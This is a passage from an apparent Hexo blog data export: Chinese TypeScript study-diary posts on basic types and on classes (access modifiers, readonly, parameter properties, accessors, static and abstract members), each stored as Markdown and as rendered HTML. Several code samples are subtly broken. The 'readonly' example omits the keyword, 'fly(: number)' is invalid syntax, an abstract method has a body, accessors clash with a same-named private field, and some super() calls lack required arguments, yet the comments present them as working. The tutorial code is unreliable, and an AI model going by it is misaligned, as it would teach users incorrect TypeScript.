定义。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr: <span class=\"built_in\">Array</span>&lt;<span class=\"built_in\">number</span>&gt; = [<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>];</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"元组-tuple\"><a href=\"#元组-tuple\" class=\"headerlink\" title=\"元组(tuple)\"></a>元组(tuple)</h4><p>元组类型允许表示一个已知元素数量和类型的数组(其实就是一个数组内包含多个类型的值)。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> tup: [<span class=\"built_in\">number</span>, <span class=\"built_in\">string</span>] = [<span class=\"number\">123</span>,<span class=\"string\">'str'</span>];</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"枚举-enum\"><a href=\"#枚举-enum\" class=\"headerlink\" title=\"枚举(enum)\"></a>枚举(enum)</h4><p><code>enum</code> 类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。<br><strong>用人话说就是：把一组值放到一个可\b迭代的对象中，然后给这个对象起了个名字。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> animal &#123;dog,cat,pig&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 对象取值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> a: animal = animal.dog</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 数组取值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> b = animal[<span class=\"number\">0</span>] <span class=\"comment\">// -&gt; dog</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> b = animal[<span class=\"number\">1</span>] <span class=\"comment\">// -&gt; cat</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 可以手动更改索引</span></span><br><span class=\"line\"><span class=\"comment\">// enum animal &#123;dog = 1, cat, pig&#125;</span></span><br><span class=\"line\"><span class=\"comment\">// let b = animal[1] // -&gt; dog</span></span><br><span class=\"line\"><span class=\"comment\">// let b = animal[2] // -&gt; cat</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"任何类型-any\"><a href=\"#任何类型-any\" class=\"headerlink\" title=\"任何类型(any)\"></a>任何类型(any)</h4><p>若是不清楚变量的具体类型可以指定为 <code>any</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a: <span class=\"built_in\">any</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">a = <span class=\"string\">'str'</span>; <span class=\"comment\">// success</span></span><br><span class=\"line\">a = <span class=\"number\">123</span>; <span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"无类型-void\"><a href=\"#无类型-void\" class=\"headerlink\" title=\"无类型(void)\"></a>无类型(void)</h4><p>与 <code>any</code> 相反。一个函数没有返回值的时候通常指定其返回值类型为 <code>void</code>。<br>一个 <code>void</code> 类型的变量只能赋值为 <code>undefined</code> | <code>null</code>。<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">noReturn</span>(<span class=\"params\"></span>): <span class=\"title\">void</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'这个函数没有返回值'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> n: <span class=\"built_in\">void</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// let n: void = undefined;</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"null和undefined\"><a href=\"#null和undefined\" class=\"headerlink\" title=\"null和undefined\"></a>null和undefined</h4><p><code>undefined</code>和<code>null</code>两者各自有自己的类型还是叫做<code>undefined</code>和<code>null</code>。</p>\n<p><strong>默认情况下null和undefined是所有类型的子类型。 就是说你可以把 null和undefined赋值给number类型的变量。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> u: <span class=\"literal\">undefined</span> = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> n: <span class=\"literal\">null</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"number\">123</span>;</span><br><span class=\"line\">num = <span class=\"literal\">undefined</span>; <span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"永远不存在的值-never\"><a href=\"#永远不存在的值-never\" class=\"headerlink\" title=\"永远不存在的值(never)\"></a>永远不存在的值(never)</h4><p>例如， never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型；<br><strong>never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使 any也不可以赋值给never。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> n: never; <span class=\"comment\">// never 不能被赋值</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> num: <span class=\"built_in\">number</span> = <span class=\"number\">123</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a: <span class=\"built_in\">any</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">num = n; <span class=\"comment\">// success，never类型是任何类型的子类型</span></span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">123</span>; <span class=\"comment\">// error</span></span><br><span class=\"line\">n = a; <span class=\"comment\">// error</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 返回never的函数必须存在无法达到的终点</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">error</span>(<span class=\"params\">message: <span class=\"built_in\">string</span></span>): <span class=\"title\">never</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(message);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"类型断言\"><a href=\"#类型断言\" class=\"headerlink\" title=\"类型断言\"></a>类型断言</h4><p>有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> str: <span class=\"built_in\">any</span> = <span class=\"string\">\"this is a string\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> strLength1: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> strLength2: <span class=\"built_in\">number</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 as 断言语法</span></span><br><span class=\"line\">strLength1 = (str <span class=\"keyword\">as</span> <span class=\"built_in\">string</span>).length;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 &lt;&gt; 断言语法</span></span><br><span class=\"line\">strLength2 = (&lt;<span class=\"built_in\">string</span>&gt;str).length;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 上面这两种断言方式得到的效果完全一致，下面增加的内容是因为模版出了点bug</span></span><br><span class=\"line\"><span class=\"comment\">// 对于语法的解析已经不是js的语法了，不填充以下内容，整块js都无法展示</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br><span class=\"line\">strLength1 === strLength2; <span class=\"comment\">// -&gt; true</span></span><br></pre></td></tr></table></figure>\n<p>以上是 <code>typescript</code> 所有的基础类型。</p>"},{"title":"Typescript学习日记(三)","date":"2017-01-22T07:51:19.000Z","_content":"`typescript` 中的类与 `ES6` 中的 `class` 功能及使用基本一致；不过 `typescript` 对于属性的定义却是使用了一些后端语言的关键字。\n<!-- more -->\n### 类\n\n`typescript` 中的类与 `ES6` 中的 `class` 功能及使用基本一致；不过 `typescript` 对于属性的定义却是使用了一些后端语言的关键字。\n\n\n#### 类的集成\n\n```ts\nclass Super {\n    // let name: string;\n    name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nclass Son extends Super {\n\n    // 在 ts 中，子类继承父类，如果之类中声明了 构造器(constructor) 则必须调用 super()\n    // 否则 ts 会抛出错误\n\n    constructor() {\n        super();\n    }\n\n    //...\n}\n\n```\n\n\n#### 公共，私有与受保护的修饰符\n\n**默认值 public**\n\n如果一个类中的成员没有显示的表明修饰符，那么默认他们都是 `public`。\n上面的例子和下面的效果是一致的：\n\n```ts\nclass Super {\n    // let name: string;\n    public name: string; \n\n    public constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n```\n\n**私有属性 private**\n\n如果一个类中的成员被标记为 `private`，那么它就不能在该类的外部被访问，因为它是私有的。\n\n```ts\nclass Super {\n    // let name: string;\n    private name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\n// error\nconsole.log(new Super('Bird').name)\n```\n\n**受保护属性 protected**\n\n`protected` 与 `private` 的行为相似，但是 `protected` 的属性在 `子类内部` 中仍然可以访问。\n\n```ts\nclass Super {\n    // let name: string;\n    protected name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nclass Son extends Super {\n\n    constructor() {\n        super(name)\n    }\n\n    handle() {\n        // success\n        console.log(this.name)\n    }\n}\n\n// 能成功输出\nconsole.log(new Son().handle)\n\n// error\nconsole.log(new Son().name) \n```\n\n构造函数被标记为 `protected` 时，该类不能被实例化，但可以被继承，继承它的之类可以被实例化。\n\n```ts\nclass Super {\n    // let name: string;\n    protected name: string; \n\n    protected constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nclass Son extends Super {\n\n    constructor() {\n        super()\n    }\n\n    handle() {\n        // ...\n    }\n}\n\nlet S = new Super(); // error, super是被保护的。\n\nlet s = new Son(); // success\n\n```\n\n**只读属性 readonly**\n\n只读属性不能被修改，必须在 `声明时或者构造函数` 里被初始化。\n\n```ts\nclass Super {\n    // let name: string;\n    name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nlet S = new Super('Jhon');\ns.name = 'Carl'; // error\n```\n\n**参数属性**\n\n在上面的例子中，我们总会声明一个 `name` 之后再通过构造器赋值。这种做法未免有些麻烦，通过 `参数属性` 我们可以将声明和赋值结合。\n\n```ts\nclass Super {\n    constructor(private name: string) { } // 直接在构造函数的参数中进行 声明、赋值\n    fly(: number) {\n        //...\n    }\n}\n```\n\n\n**储存器**\n\n通过储存器，我们可以修改上文中提到的 `private` 属性。\n\n```ts\n\nclass Super {\n    private name: string;\n\n    constructor(n: string) { this.name = n }\n\n    get name(): string {\n        return this.name;\n    }\n\n    set name(n: string) {\n        this.name = n;\n    }\n}\n\nlet s = new Super('Jhon');\nconsole.log(s.name); // -> 'Jhon'\n\ns.name = 'Carl';\n\nconsole.log(s.name); // -> 'Carl'\n\n```\n\n**静态属性 static**\n\n上面的例子中属性大多都是实例化之后才能访问到的属性，通过 `static` 我们可以给类设置静态属性。\n\n```ts\nclass Super {\n    static name = 'Jhon';\n\n    constructor() {  }\n}\n\nconsole.log(Super.name); // -> 'Jhon'\n```\n\n**抽象类 abstract**\n\n抽象类作为其它子类的父类使用，不能被实例化；不同于接口，抽象类可以包含成员的实现细节。\n抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似，两者都是定义方法签名但不包含方法体。\n\n```ts\nabstract class Super {\n    abstract name: string;\n\n    abstract fly(): void {\n        // ...\n    }\n}\n\nclass Son extends Super {\n    constructor() {\n        super()\n    }\n\n    eat():void {\n        // ...\n    }\n}\n\nlet S = new Super(); // -> error，抽象类不能被实例化\nlet s = new Son(); // -> success\n\ns.fly(); // -> success \ns.eat(); // -> error, 抽象类中没有 eat 方法\n```\n\n#### 小结\n\n`typescript` 中的类其实就是 `javascript` 中的构造函数；他们的用法完全相似，只不过 `typescript` 给构造函数添加了一些后端语言才有的 `修饰符`。\n\n\n","source":"_posts/Typescript学习日记（三）.md","raw":"---\ntitle: Typescript学习日记(三)\ndate: 2017-01-22 15:51:19\ntags:\n---\n`typescript` 中的类与 `ES6` 中的 `class` 功能及使用基本一致；不过 `typescript` 对于属性的定义却是使用了一些后端语言的关键字。\n<!-- more -->\n### 类\n\n`typescript` 中的类与 `ES6` 中的 `class` 功能及使用基本一致；不过 `typescript` 对于属性的定义却是使用了一些后端语言的关键字。\n\n\n#### 类的集成\n\n```ts\nclass Super {\n    // let name: string;\n    name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nclass Son extends Super {\n\n    // 在 ts 中，子类继承父类，如果之类中声明了 构造器(constructor) 则必须调用 super()\n    // 否则 ts 会抛出错误\n\n    constructor() {\n        super();\n    }\n\n    //...\n}\n\n```\n\n\n#### 公共，私有与受保护的修饰符\n\n**默认值 public**\n\n如果一个类中的成员没有显示的表明修饰符，那么默认他们都是 `public`。\n上面的例子和下面的效果是一致的：\n\n```ts\nclass Super {\n    // let name: string;\n    public name: string; \n\n    public constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n```\n\n**私有属性 private**\n\n如果一个类中的成员被标记为 `private`，那么它就不能在该类的外部被访问，因为它是私有的。\n\n```ts\nclass Super {\n    // let name: string;\n    private name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\n// error\nconsole.log(new Super('Bird').name)\n```\n\n**受保护属性 protected**\n\n`protected` 与 `private` 的行为相似，但是 `protected` 的属性在 `子类内部` 中仍然可以访问。\n\n```ts\nclass Super {\n    // let name: string;\n    protected name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nclass Son extends Super {\n\n    constructor() {\n        super(name)\n    }\n\n    handle() {\n        // success\n        console.log(this.name)\n    }\n}\n\n// 能成功输出\nconsole.log(new Son().handle)\n\n// error\nconsole.log(new Son().name) \n```\n\n构造函数被标记为 `protected` 时，该类不能被实例化，但可以被继承，继承它的之类可以被实例化。\n\n```ts\nclass Super {\n    // let name: string;\n    protected name: string; \n\n    protected constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nclass Son extends Super {\n\n    constructor() {\n        super()\n    }\n\n    handle() {\n        // ...\n    }\n}\n\nlet S = new Super(); // error, super是被保护的。\n\nlet s = new Son(); // success\n\n```\n\n**只读属性 readonly**\n\n只读属性不能被修改，必须在 `声明时或者构造函数` 里被初始化。\n\n```ts\nclass Super {\n    // let name: string;\n    name: string; \n\n    constructor(n: string) {\n        this.name = n;\n    }\n\n    public fly () {\n        console.log(`${this.name} can fly!`)\n    }\n}\n\nlet S = new Super('Jhon');\ns.name = 'Carl'; // error\n```\n\n**参数属性**\n\n在上面的例子中，我们总会声明一个 `name` 之后再通过构造器赋值。这种做法未免有些麻烦，通过 `参数属性` 我们可以将声明和赋值结合。\n\n```ts\nclass Super {\n    constructor(private name: string) { } // 直接在构造函数的参数中进行 声明、赋值\n    fly(: number) {\n        //...\n    }\n}\n```\n\n\n**储存器**\n\n通过储存器，我们可以修改上文中提到的 `private` 属性。\n\n```ts\n\nclass Super {\n    private name: string;\n\n    constructor(n: string) { this.name = n }\n\n    get name(): string {\n        return this.name;\n    }\n\n    set name(n: string) {\n        this.name = n;\n    }\n}\n\nlet s = new Super('Jhon');\nconsole.log(s.name); // -> 'Jhon'\n\ns.name = 'Carl';\n\nconsole.log(s.name); // -> 'Carl'\n\n```\n\n**静态属性 static**\n\n上面的例子中属性大多都是实例化之后才能访问到的属性，通过 `static` 我们可以给类设置静态属性。\n\n```ts\nclass Super {\n    static name = 'Jhon';\n\n    constructor() {  }\n}\n\nconsole.log(Super.name); // -> 'Jhon'\n```\n\n**抽象类 abstract**\n\n抽象类作为其它子类的父类使用，不能被实例化；不同于接口，抽象类可以包含成员的实现细节。\n抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似，两者都是定义方法签名但不包含方法体。\n\n```ts\nabstract class Super {\n    abstract name: string;\n\n    abstract fly(): void {\n        // ...\n    }\n}\n\nclass Son extends Super {\n    constructor() {\n        super()\n    }\n\n    eat():void {\n        // ...\n    }\n}\n\nlet S = new Super(); // -> error，抽象类不能被实例化\nlet s = new Son(); // -> success\n\ns.fly(); // -> success \ns.eat(); // -> error, 抽象类中没有 eat 方法\n```\n\n#### 小结\n\n`typescript` 中的类其实就是 `javascript` 中的构造函数；他们的用法完全相似，只不过 `typescript` 给构造函数添加了一些后端语言才有的 `修饰符`。\n\n\n","slug":"Typescript学习日记（三）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qh000702vs5cq8yocx","content":"<p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。<br><a id=\"more\"></a></p>\n<h3 id=\"类\"><a href=\"#类\" class=\"headerlink\" title=\"类\"></a>类</h3><p><code>typescript</code> 中的类与 <code>ES6</code> 中的 <code>class</code> 功能及使用基本一致；不过 <code>typescript</code> 对于属性的定义却是使用了一些后端语言的关键字。</p>\n<h4 id=\"类的集成\"><a href=\"#类的集成\" class=\"headerlink\" title=\"类的集成\"></a>类的集成</h4><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 在 ts 中，子类继承父类，如果之类中声明了 构造器(constructor) 则必须调用 super()</span></span><br><span class=\"line\">    <span class=\"comment\">// 否则 ts 会抛出错误</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"公共，私有与受保护的修饰符\"><a href=\"#公共，私有与受保护的修饰符\" class=\"headerlink\" title=\"公共，私有与受保护的修饰符\"></a>公共，私有与受保护的修饰符</h4><p><strong>默认值 public</strong></p>\n<p>如果一个类中的成员没有显示的表明修饰符，那么默认他们都是 <code>public</code>。<br>上面的例子和下面的效果是一致的：</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>私有属性 private</strong></p>\n<p>如果一个类中的成员被标记为 <code>private</code>，那么它就不能在该类的外部被访问，因为它是私有的。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// error</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> Super(<span class=\"string\">'Bird'</span>).name)</span><br></pre></td></tr></table></figure>\n<p><strong>受保护属性 protected</strong></p>\n<p><code>protected</code> 与 <code>private</code> 的行为相似，但是 <code>protected</code> 的属性在 <code>子类内部</code> 中仍然可以访问。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Super &#123;</span><br><span class=\"line\">    <span class=\"comment\">// let name: string;</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> name: <span class=\"built_in\">string</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">n: <span class=\"built_in\">string</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = n;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> fly () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">`<span class=\"subst\">$&#123;this.name&#125;</span> can fly!`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> Son <span class=\"keyword\">extends</span> Super &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    handle() &#123;</span><br><span class=\"line\">        <span class=\"comment\">// success</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.name)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 能成功输出</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> Son().handle)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// error</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">new</span> Son().name)</span><br></pre></td></tr></table></figure>\n<p>构造函数被标记为 <code>protected</code> 时，该类不能被实例化，但可以被继承，继承它的之类可以被实例化。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 